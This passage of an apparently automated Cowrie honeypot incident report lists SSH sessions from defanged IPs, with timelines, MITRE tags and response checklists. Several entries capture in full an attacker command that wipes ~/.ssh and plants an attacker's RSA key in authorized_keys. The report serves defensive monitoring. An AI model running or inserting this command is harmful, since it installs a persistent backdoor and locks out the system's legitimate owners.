|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 13:50 |
| **Last Seen** | 2026-07-02 13:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:50:51` | `cowrie.session.connect` |
| `2026-07-02 13:50:51` | `cowrie.client.version` |
| `2026-07-02 13:50:51` | `cowrie.client.kex` |
| `2026-07-02 13:50:53` | `cowrie.login.success` |
| `2026-07-02 13:50:54` | `cowrie.session.params` |
| `2026-07-02 13:50:54` | `cowrie.command.input` |
| `2026-07-02 13:50:54` | `cowrie.log.closed` |
| `2026-07-02 13:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4157526c7d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 13:56 |
| **Last Seen** | 2026-07-02 13:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:56:41` | `cowrie.session.connect` |
| `2026-07-02 13:56:43` | `cowrie.client.version` |
| `2026-07-02 13:56:43` | `cowrie.client.kex` |
| `2026-07-02 13:56:47` | `cowrie.login.success` |
| `2026-07-02 13:56:50` | `cowrie.session.params` |
| `2026-07-02 13:56:50` | `cowrie.command.input` |
| `2026-07-02 13:56:52` | `cowrie.log.closed` |
| `2026-07-02 13:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d0c291eb006

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 14:01 |
| **Last Seen** | 2026-07-02 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:01:09` | `cowrie.session.connect` |
| `2026-07-02 14:01:09` | `cowrie.client.version` |
| `2026-07-02 14:01:09` | `cowrie.client.kex` |
| `2026-07-02 14:01:09` | `cowrie.login.success` |
| `2026-07-02 14:01:10` | `cowrie.session.params` |
| `2026-07-02 14:01:10` | `cowrie.command.input` |
| `2026-07-02 14:01:10` | `cowrie.log.closed` |
| `2026-07-02 14:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f918c2d48229

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 14:04 |
| **Last Seen** | 2026-07-02 14:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:04:59` | `cowrie.session.connect` |
| `2026-07-02 14:05:00` | `cowrie.client.version` |
| `2026-07-02 14:05:00` | `cowrie.client.kex` |
| `2026-07-02 14:05:01` | `cowrie.login.success` |
| `2026-07-02 14:05:03` | `cowrie.session.params` |
| `2026-07-02 14:05:03` | `cowrie.command.input` |
| `2026-07-02 14:05:03` | `cowrie.log.closed` |
| `2026-07-02 14:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52186f9647e7

| Field | Detail |
|---|---|
| **Source IP** | `156.232.13[.]161` |
| **First Seen** | 2026-07-02 14:06 |
| **Last Seen** | 2026-07-02 14:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:06:10` | `cowrie.session.connect` |
| `2026-07-02 14:06:10` | `cowrie.client.version` |
| `2026-07-02 14:06:11` | `cowrie.client.kex` |
| `2026-07-02 14:06:11` | `cowrie.login.success` |
| `2026-07-02 14:06:11` | `cowrie.session.params` |
| `2026-07-02 14:06:11` | `cowrie.command.input` |
| `2026-07-02 14:06:11` | `cowrie.command.failed` |
| `2026-07-02 14:06:12` | `cowrie.log.closed` |
| `2026-07-02 14:06:12` | `cowrie.session.params` |
| `2026-07-02 14:06:12` | `cowrie.command.input` |
| `2026-07-02 14:06:12` | `cowrie.session.file_download` |
| `2026-07-02 14:06:12` | `cowrie.log.closed` |
| `2026-07-02 14:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.232.13[.]161` to AbuseIPDB if not already reported
- [ ] Block `156.232.13[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565c19edbc03

| Field | Detail |
|---|---|
| **Source IP** | `156.232.13[.]161` |
| **First Seen** | 2026-07-02 14:06 |
| **Last Seen** | 2026-07-02 14:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:06:12` | `cowrie.session.connect` |
| `2026-07-02 14:06:12` | `cowrie.client.version` |
| `2026-07-02 14:06:12` | `cowrie.client.kex` |
| `2026-07-02 14:06:13` | `cowrie.login.success` |
| `2026-07-02 14:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.232.13[.]161` to AbuseIPDB if not already reported
- [ ] Block `156.232.13[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49545f1c4fd9

| Field | Detail |
|---|---|
| **Source IP** | `156.232.13[.]161` |
| **First Seen** | 2026-07-02 14:06 |
| **Last Seen** | 2026-07-02 14:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:06:13` | `cowrie.session.connect` |
| `2026-07-02 14:06:13` | `cowrie.client.version` |
| `2026-07-02 14:06:13` | `cowrie.client.kex` |
| `2026-07-02 14:06:13` | `cowrie.login.success` |
| `2026-07-02 14:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.232.13[.]161` to AbuseIPDB if not already reported
- [ ] Block `156.232.13[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-506f2603e463

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 14:08 |
| **Last Seen** | 2026-07-02 14:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:08:02` | `cowrie.session.connect` |
| `2026-07-02 14:08:04` | `cowrie.client.version` |
| `2026-07-02 14:08:04` | `cowrie.client.kex` |
| `2026-07-02 14:08:09` | `cowrie.login.success` |
| `2026-07-02 14:08:14` | `cowrie.session.params` |
| `2026-07-02 14:08:14` | `cowrie.command.input` |
| `2026-07-02 14:08:15` | `cowrie.log.closed` |
| `2026-07-02 14:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c590ec45859

| Field | Detail |
|---|---|
| **Source IP** | `149.91.97[.]132` |
| **First Seen** | 2026-07-02 14:08 |
| **Last Seen** | 2026-07-02 14:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:08:14` | `cowrie.session.connect` |
| `2026-07-02 14:08:14` | `cowrie.client.version` |
| `2026-07-02 14:08:14` | `cowrie.client.kex` |
| `2026-07-02 14:08:14` | `cowrie.login.success` |
| `2026-07-02 14:08:15` | `cowrie.session.params` |
| `2026-07-02 14:08:15` | `cowrie.command.input` |
| `2026-07-02 14:08:15` | `cowrie.command.failed` |
| `2026-07-02 14:08:15` | `cowrie.log.closed` |
| `2026-07-02 14:08:16` | `cowrie.session.params` |
| `2026-07-02 14:08:16` | `cowrie.command.input` |
| `2026-07-02 14:08:16` | `cowrie.session.file_download` |
| `2026-07-02 14:08:16` | `cowrie.log.closed` |
| `2026-07-02 14:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.91.97[.]132` to AbuseIPDB if not already reported
- [ ] Block `149.91.97[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee000b67f08d

| Field | Detail |
|---|---|
| **Source IP** | `149.91.97[.]132` |
| **First Seen** | 2026-07-02 14:08 |
| **Last Seen** | 2026-07-02 14:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:08:16` | `cowrie.session.connect` |
| `2026-07-02 14:08:16` | `cowrie.client.version` |
| `2026-07-02 14:08:16` | `cowrie.client.kex` |
| `2026-07-02 14:08:17` | `cowrie.login.success` |
| `2026-07-02 14:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.91.97[.]132` to AbuseIPDB if not already reported
- [ ] Block `149.91.97[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c97bf97c4fc

| Field | Detail |
|---|---|
| **Source IP** | `149.91.97[.]132` |
| **First Seen** | 2026-07-02 14:08 |
| **Last Seen** | 2026-07-02 14:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:08:17` | `cowrie.session.connect` |
| `2026-07-02 14:08:17` | `cowrie.client.version` |
| `2026-07-02 14:08:17` | `cowrie.client.kex` |
| `2026-07-02 14:08:17` | `cowrie.login.success` |
| `2026-07-02 14:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.91.97[.]132` to AbuseIPDB if not already reported
- [ ] Block `149.91.97[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adcd94f6f913

| Field | Detail |
|---|---|
| **Source IP** | `92.50.89[.]157` |
| **First Seen** | 2026-07-02 14:17 |
| **Last Seen** | 2026-07-02 14:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:17:44` | `cowrie.session.connect` |
| `2026-07-02 14:17:44` | `cowrie.client.version` |
| `2026-07-02 14:17:44` | `cowrie.client.kex` |
| `2026-07-02 14:17:45` | `cowrie.login.success` |
| `2026-07-02 14:17:45` | `cowrie.session.params` |
| `2026-07-02 14:17:45` | `cowrie.command.input` |
| `2026-07-02 14:17:45` | `cowrie.command.failed` |
| `2026-07-02 14:17:46` | `cowrie.log.closed` |
| `2026-07-02 14:17:46` | `cowrie.session.params` |
| `2026-07-02 14:17:46` | `cowrie.command.input` |
| `2026-07-02 14:17:46` | `cowrie.session.file_download` |
| `2026-07-02 14:17:46` | `cowrie.log.closed` |
| `2026-07-02 14:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.50.89[.]157` to AbuseIPDB if not already reported
- [ ] Block `92.50.89[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53a47cb0c79a

| Field | Detail |
|---|---|
| **Source IP** | `92.50.89[.]157` |
| **First Seen** | 2026-07-02 14:17 |
| **Last Seen** | 2026-07-02 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:17:46` | `cowrie.session.connect` |
| `2026-07-02 14:17:46` | `cowrie.client.version` |
| `2026-07-02 14:17:47` | `cowrie.client.kex` |
| `2026-07-02 14:17:47` | `cowrie.login.success` |
| `2026-07-02 14:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.50.89[.]157` to AbuseIPDB if not already reported
- [ ] Block `92.50.89[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad07fcb1d91

| Field | Detail |
|---|---|
| **Source IP** | `92.50.89[.]157` |
| **First Seen** | 2026-07-02 14:17 |
| **Last Seen** | 2026-07-02 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:17:47` | `cowrie.session.connect` |
| `2026-07-02 14:17:47` | `cowrie.client.version` |
| `2026-07-02 14:17:47` | `cowrie.client.kex` |
| `2026-07-02 14:17:48` | `cowrie.login.success` |
| `2026-07-02 14:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.50.89[.]157` to AbuseIPDB if not already reported
- [ ] Block `92.50.89[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bcf73c4496b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 14:19 |
| **Last Seen** | 2026-07-02 14:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:19:31` | `cowrie.session.connect` |
| `2026-07-02 14:19:32` | `cowrie.client.version` |
| `2026-07-02 14:19:32` | `cowrie.client.kex` |
| `2026-07-02 14:19:34` | `cowrie.login.success` |
| `2026-07-02 14:19:35` | `cowrie.session.params` |
| `2026-07-02 14:19:35` | `cowrie.command.input` |
| `2026-07-02 14:19:35` | `cowrie.log.closed` |
| `2026-07-02 14:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be2ebfbc9b3b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 14:19 |
| **Last Seen** | 2026-07-02 14:19 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:19:38` | `cowrie.session.connect` |
| `2026-07-02 14:19:40` | `cowrie.client.version` |
| `2026-07-02 14:19:40` | `cowrie.client.kex` |
| `2026-07-02 14:19:45` | `cowrie.login.success` |
| `2026-07-02 14:19:49` | `cowrie.session.params` |
| `2026-07-02 14:19:49` | `cowrie.command.input` |
| `2026-07-02 14:19:51` | `cowrie.log.closed` |
| `2026-07-02 14:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca2206137b9

| Field | Detail |
|---|---|
| **Source IP** | `117.72.209[.]56` |
| **First Seen** | 2026-07-02 14:20 |
| **Last Seen** | 2026-07-02 14:25 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:20:25` | `cowrie.session.connect` |
| `2026-07-02 14:20:25` | `cowrie.client.version` |
| `2026-07-02 14:20:25` | `cowrie.client.kex` |
| `2026-07-02 14:20:27` | `cowrie.login.success` |
| `2026-07-02 14:20:28` | `cowrie.session.params` |
| `2026-07-02 14:20:28` | `cowrie.command.input` |
| `2026-07-02 14:20:28` | `cowrie.command.failed` |
| `2026-07-02 14:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.72.209[.]56` to AbuseIPDB if not already reported
- [ ] Block `117.72.209[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c36ba717768

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 14:31 |
| **Last Seen** | 2026-07-02 14:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:31:16` | `cowrie.session.connect` |
| `2026-07-02 14:31:17` | `cowrie.client.version` |
| `2026-07-02 14:31:17` | `cowrie.client.kex` |
| `2026-07-02 14:31:24` | `cowrie.login.success` |
| `2026-07-02 14:31:27` | `cowrie.session.params` |
| `2026-07-02 14:31:27` | `cowrie.command.input` |
| `2026-07-02 14:31:30` | `cowrie.log.closed` |
| `2026-07-02 14:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-608675ee860f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 14:34 |
| **Last Seen** | 2026-07-02 14:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:34:51` | `cowrie.session.connect` |
| `2026-07-02 14:34:52` | `cowrie.client.version` |
| `2026-07-02 14:34:52` | `cowrie.client.kex` |
| `2026-07-02 14:34:53` | `cowrie.login.success` |
| `2026-07-02 14:34:55` | `cowrie.session.params` |
| `2026-07-02 14:34:55` | `cowrie.command.input` |
| `2026-07-02 14:34:56` | `cowrie.log.closed` |
| `2026-07-02 14:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47bff937d039

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-07-02 14:36 |
| **Last Seen** | 2026-07-02 14:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:36:12` | `cowrie.session.connect` |
| `2026-07-02 14:36:12` | `cowrie.client.version` |
| `2026-07-02 14:36:12` | `cowrie.client.kex` |
| `2026-07-02 14:36:13` | `cowrie.login.success` |
| `2026-07-02 14:36:14` | `cowrie.session.params` |
| `2026-07-02 14:36:14` | `cowrie.command.input` |
| `2026-07-02 14:36:14` | `cowrie.command.failed` |
| `2026-07-02 14:36:14` | `cowrie.log.closed` |
| `2026-07-02 14:36:15` | `cowrie.session.params` |
| `2026-07-02 14:36:15` | `cowrie.command.input` |
| `2026-07-02 14:36:15` | `cowrie.session.file_download` |
| `2026-07-02 14:36:15` | `cowrie.log.closed` |
| `2026-07-02 14:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92bc2a38d110

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-07-02 14:36 |
| **Last Seen** | 2026-07-02 14:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:36:15` | `cowrie.session.connect` |
| `2026-07-02 14:36:15` | `cowrie.client.version` |
| `2026-07-02 14:36:15` | `cowrie.client.kex` |
| `2026-07-02 14:36:16` | `cowrie.login.success` |
| `2026-07-02 14:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a6de8b31a0

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-07-02 14:36 |
| **Last Seen** | 2026-07-02 14:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:36:16` | `cowrie.session.connect` |
| `2026-07-02 14:36:16` | `cowrie.client.version` |
| `2026-07-02 14:36:17` | `cowrie.client.kex` |
| `2026-07-02 14:36:17` | `cowrie.login.success` |
| `2026-07-02 14:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e04632dc21a7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]56` |
| **First Seen** | 2026-07-02 14:39 |
| **Last Seen** | 2026-07-02 14:44 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
